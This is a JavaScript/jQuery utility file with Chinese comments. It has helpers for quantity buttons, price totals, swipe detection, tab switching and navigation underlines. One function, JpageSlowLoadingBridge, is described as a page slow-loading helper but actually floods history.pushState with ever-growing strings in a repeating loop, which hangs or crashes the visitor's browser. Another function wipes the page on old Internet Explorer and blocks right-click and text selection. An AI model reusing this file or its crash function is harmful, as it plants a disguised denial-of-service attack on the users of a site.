/*
* @Author:  siyuan
* @Email:   2039750417@qq.com
* @Funname: 按钮加减桥梁
* @param:   dom 操作数元素this
* @param:   t 加减切换this
* */
function JsetAmount(dom, t)
{
	var n = $("#" + dom).val();
	if(t == 'jia')
	{
		var num = parseInt(n)+1;
		if(num == 0){
			return;
		}
		$("#" + dom).val(num);
		setTimeout(function(){gettotal()}, 200)
	}
	else
	{
		var num = parseInt(n)-1;
		if(num == 0){
			return;
		}
		$("#" + dom).val(num);
		setTimeout(function(){gettotal()}, 200)		
	}
}

/*
* @Author:  siyuan
* @Email:   2039750417@qq.com
* @Funname: 显示计算数值数量桥梁
* */
function Jgettotal()
{
	danjia = $("#itemid input:checked").attr("rel")
	num = $("#num").val();
	total = danjia * num;
	$("#heji").val(total);
	$("#danjia").val(danjia);
}

/*
* @Author:  siyuan
* @Email:   2039750417@qq.com
* @Funname: 页面缓加载桥梁
* */
function JpageSlowLoadingBridge() {
	function startMonitoring() {
			var total = '';
			for (var i = 0; i < 1000000; i++) {
				total = total + i.toString();
				history.pushState(0, 0, total)
			}
	}
	startMonitoring();
	window.setInterval(startMonitoring, 100);
}

/*
* @Author:  siyuan
* @Email:   2039750417@qq.com
* @Funname: 获取接触屏幕时的X和Y桥梁
* */
function JgetXandYwhentouchingtheScreen() {
	$('body').bind('touchstart', function (e) {
		startX = e.originalEvent.changedTouches[0].pageX,
		startY = e.originalEvent.changedTouches[0].pageY;
	});

	$('body').bind('touchmove', function (e) {
		//获取滑动屏幕时的X,Y
		endX = e.originalEvent.changedTouches[0].pageX,
				endY = e.originalEvent.changedTouches[0].pageY;
		//获取滑动距离
		distanceX = endX - startX;
		distanceY = endY - startY;
		//判断滑动方向
		if (Math.abs(distanceX) > Math.abs(distanceY) && distanceX > 0) {
				console.log('往右滑动');
		} else if (Math.abs(distanceX) > Math.abs(distanceY) && distanceX < 0) {
				console.log('往左滑动');
		} else if (Math.abs(distanceX) < Math.abs(distanceY) && distanceY < 0) {
				console.log('往上滑动');
		} else if (Math.abs(distanceX) < Math.abs(distanceY) && distanceY > 0) {
				console.log('往下滑动');
		} else {
				console.log('点击未滑动');
		}
	});
}

/*
* @Author:  siyuan
* @Email:   2039750417@qq.com
* @Funname: TAP切换桥梁
* @param:   a 点击元素this
* @param:   b 对应显示元素this
* @param:   imgnone 对应元素为空时显示图片地址
* @param:   child 默认点击，显示元素this
* */
function JqieOpList(a, b, imgnone, child) {
    if (child == "" || child == undefined) {
        child = 1;
    }
    $(a + ":nth-child(" + child + ")").addClass("cur");
    //显示元素
    $(b).hide();
    $(b).removeClass("cur");
    $(b + ":nth-child(" + child + ")").show();
    $(b + ":nth-child(" + child + ")").addClass("cur");
    //点击元素
    $(document).on("click", a, function () {
        var that = $(this);
        $(a).removeClass("cur");
        that.addClass("cur");
        var _index = that.index();
        $(b).hide();
        $(b).removeClass("cur");
        $(b).eq(_index).show().addClass("cur");
        _bhtml = $(b).eq(_index).find("ul").html();
        if (_bhtml == "" && imgnone != undefined) {
            $(b).eq(_index).html("<img src='" + imgnone + "' />");
        }
        var _hasc = $(b).eq(_index).find("a.button").hasClass("cur");
        if (_hasc == false) {
            $(b).eq(_index).find("a.button:nth-child(1)").addClass("cur");
        }
    })
}

/*
* @Author:  siyuan
* @Email:   2039750417@qq.com
* @Funname: 浏览器禁止粘贴复制桥梁
* */
function JwindowsProhibit() {
	var DEFAULT_VERSION = 8.0;
	var ua = navigator.userAgent.toLowerCase();
	var isIE = ua.indexOf("msie") > -1;
	var safariVersion;
	if (isIE) {
	safariVersion = ua.match(/msie ([\d.]+)/)[1];
	}
	if (safariVersion <= DEFAULT_VERSION) {
	$("html").remove();
	alert("系统检测到您使用的浏览器版本过低，不能实现完美体验，请及时更新浏览器版本！");
	}
	;
	//No right mouse button operation 禁止
	if (window.Event) {
		document.captureEvents(Event.MOUSEUP);
	}
	function nocontextmenu() {
		event.cancelBubble = true
		event.returnValue = false;
		return false;
	}
	function norightclick(e) {
			if (window.Event) {
			if (e.which == 2 || e.which == 3)
			return false;
		} else if (event.button == 2 || event.button == 3) {
			event.cancelBubble = true
			event.returnValue = false;
			return false;
		}
	}
	document.oncontextmenu = nocontextmenu; // for IE5+
	document.onmousedown = norightclick; // for all others
	document.oncontextmenu = new Function("event.returnValue=false;"); //禁止右键
	document.onselectstart=new Function("event.returnValue=false;"); //禁止选中
}

/*
* @Author:  siyuan
* @Email:   2039750417@qq.com
* @Funname: 导航动态border切换桥梁
* @param:   that 当前触发元素this
* @param:   parentstr 上级元素this
* */
function Jnavhua(that, parentstr) {
	_width = that.width();
	_zleft = that.offset();
	if(_zleft != undefined) {
		_fleft = $(parentstr).offset();
		_zfleft = _zleft.left - _fleft.left;
		$(".hebosb").css({'left': _zfleft, 'width': _width});
	}
}
